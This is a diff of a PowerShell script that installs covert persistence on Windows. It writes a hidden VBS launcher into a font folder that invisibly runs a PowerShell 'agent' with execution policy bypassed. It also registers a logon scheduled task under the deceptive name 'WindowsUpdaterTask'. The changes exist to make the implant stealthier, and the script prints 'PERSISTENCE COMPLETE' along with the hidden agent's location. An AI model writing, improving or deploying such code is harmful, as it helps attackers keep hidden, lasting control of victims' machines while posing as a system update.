@@ -59,39 +59,42 @@ Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
 attrib +h $launcherPath
 Write-Output "[+] Created launcher with cleanup: $launcherPath"
 
-# --- 4. Create scheduled task (try COM, fallback to schtasks) ---
+# --- 4. Create VBS launcher (completely invisible) ---
+$vbsPath = "$fontDir\run.vbs"
+$vbsContent = @"
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$launcherPath`"", 0, False
+"@
+Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII -Force
+attrib +h $vbsPath
+Write-Output "[+] Created VBS launcher: $vbsPath"
+
+# --- 5. Create scheduled task (run the VBS) ---
 $taskName = "WindowsUpdaterTask"
-$taskCommand = "powershell.exe -WindowStyle Hidden -File `"$launcherPath`""
 $taskCreated = $false
 
-# First try COM
+# Try COM first
 try {
     Write-Output "[*] Attempting to create task via COM..."
     $taskService = New-Object -ComObject Schedule.Service
-    if (-not $taskService) { throw "Failed to create Schedule.Service object" }
     $taskService.Connect()
     $rootFolder = $taskService.GetFolder("\")
-    if (-not $rootFolder) { throw "Failed to get root folder" }
-
-    # Delete existing task if any
     try { $rootFolder.DeleteTask($taskName, 0) *>$null } catch { }
 
     $taskDefinition = $taskService.NewTask(0)
-    if (-not $taskDefinition) { throw "Failed to create task definition" }
-
     $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
     $taskDefinition.Principal.UserId = $env:USERNAME
-    $taskDefinition.Principal.LogonType = 3  # TASK_LOGON_INTERACTIVE_TOKEN
+    $taskDefinition.Principal.LogonType = 3
 
-    $trigger = $taskDefinition.Triggers.Create(9)  # TASK_TRIGGER_LOGON
+    $trigger = $taskDefinition.Triggers.Create(9)
     $trigger.UserId = $env:USERNAME
 
-    $action = $taskDefinition.Actions.Create(0)  # TASK_ACTION_EXEC
-    $action.Path = "powershell.exe"
-    $action.Arguments = "-WindowStyle Hidden -File `"$launcherPath`""
+    $action = $taskDefinition.Actions.Create(0)
+    $action.Path = "wscript.exe"
+    $action.Arguments = "`"$vbsPath`""
 
     $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
-    Write-Output "[+] Scheduled task '$taskName' created/updated via COM."
+    Write-Output "[+] Scheduled task '$taskName' created/updated via COM (runs VBS)."
     $taskCreated = $true
 } catch {
     Write-Output "[-] COM task creation failed: $_"
@@ -100,28 +103,23 @@ try {
 # Fallback to schtasks if COM failed
 if (-not $taskCreated) {
     Write-Output "[*] Falling back to schtasks..."
-    try {
-        # Delete existing task if any
-        schtasks /delete /tn $taskName /f *>$null
-        # Create new task
-        schtasks /create /tn $taskName /tr "$taskCommand" /sc onlogon /ru $env:USERNAME /f /it *>$null
-        if ($LASTEXITCODE -eq 0) {
-            Write-Output "[+] Scheduled task '$taskName' created/updated via schtasks."
-            $taskCreated = $true
-        } else {
-            Write-Output "[-] schtasks failed with exit code $LASTEXITCODE"
-        }
-    } catch {
-        Write-Output "[-] schtasks exception: $_"
+    schtasks /delete /tn $taskName /f *>$null
+    schtasks /create /tn $taskName /tr "wscript.exe `"$vbsPath`"" /sc onlogon /ru $env:USERNAME /f /it *>$null
+    if ($LASTEXITCODE -eq 0) {
+        Write-Output "[+] Scheduled task '$taskName' created/updated via schtasks (runs VBS)."
+        $taskCreated = $true
+    } else {
+        Write-Output "[-] schtasks failed with exit code $LASTEXITCODE"
     }
 }
 
 if (-not $taskCreated) {
-    Write-Output "❌ Failed to create scheduled task using any method. Persistence will not survive reboot."
+    Write-Output "❌ Failed to create scheduled task."
 } else {
     Write-Output ""
     Write-Output "✅ PERSISTENCE COMPLETE"
     Write-Output "Script location: $launcherPath"
+    Write-Output "VBS launcher: $vbsPath"
     Write-Output "Agent hidden in: $hiddenPath"
-    Write-Output "The scheduled task will run the script from the permanent folder on next logon."
+    Write-Output "The scheduled task will run the VBS (invisible) on next logon."
 }
